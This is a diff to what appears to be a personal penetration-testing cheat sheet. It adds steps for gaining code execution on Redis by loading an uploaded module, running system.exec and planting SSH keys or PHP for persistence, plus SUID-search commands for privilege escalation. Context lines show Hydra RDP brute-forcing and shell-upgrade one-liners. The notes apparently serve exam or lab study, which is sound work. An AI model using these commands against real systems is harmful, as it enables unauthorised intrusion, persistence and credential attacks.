@@ -900,6 +900,18 @@ sudo python3 redis-master.py -r 192.168.89.69 -L 192.168.49.89 -P 80 -f RedisMod
 Vulnerable versions to RCE: 4.x/5.x
 Metasploit: linux/redis/redis_rce
 
+Command Injection Modules
+	1) Locate module.so file in /home/kali/Documents/exploits
+	2) Upload it somehow to the target. FTP or HTTP will be the most common methods
+	3) redis-cli -h 192.168.200.1
+	4) MODULE LOAD /var/ftp/pub/module.so
+	5) Verify: MODULE LIST
+	6) system.exec "id"
+	7) Upgrade to a stable shell. I like planting SSH keys or uploading PHP
+
+References:
+	https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis
+
 ```
 
 ## MsDeploy - 8172
@@ -1901,12 +1913,13 @@ nano
 ```
 # SUID
 find / -perm -4000 -type f 2>/dev/null
+find / -perm -u=s -type f 2>/dev/null
 
 # ALL PERMS
 find / -perm -777 -type f 2>/dev/null
 
 # SUID for current user
-find / perm /u=s -user `whoami` 2>/dev/null
+find / perm -u=s -user `whoami` 2>/dev/null
 find / -user root -perm -4000 -print 2>/dev/null
 
 # Writables for current user/group
@@ -2918,12 +2931,10 @@ hydra -t 1 -V -f -l administrator -P Desktop/rockyou.txt rdp://192.168.100.55
 
 	Bash:
 		/bin/sh -i
-		 /usr/bin/script -qc /bin/bash /dev/null
+		/usr/bin/script -qc /bin/bash /dev/null
 
   	Python:
 	  	python3 -c 'import pty; pty.spawn("/bin/sh")'
-		python3 -c "__import__('pty').spawn('/bin/bash')"
-		python3 -c "__import__('subprocess').call(['/bin/bash'])"
 	Perl:
 	 	perl -e 'exec "/bin/sh";'
 		perl -e 'print `/bin/bash`'
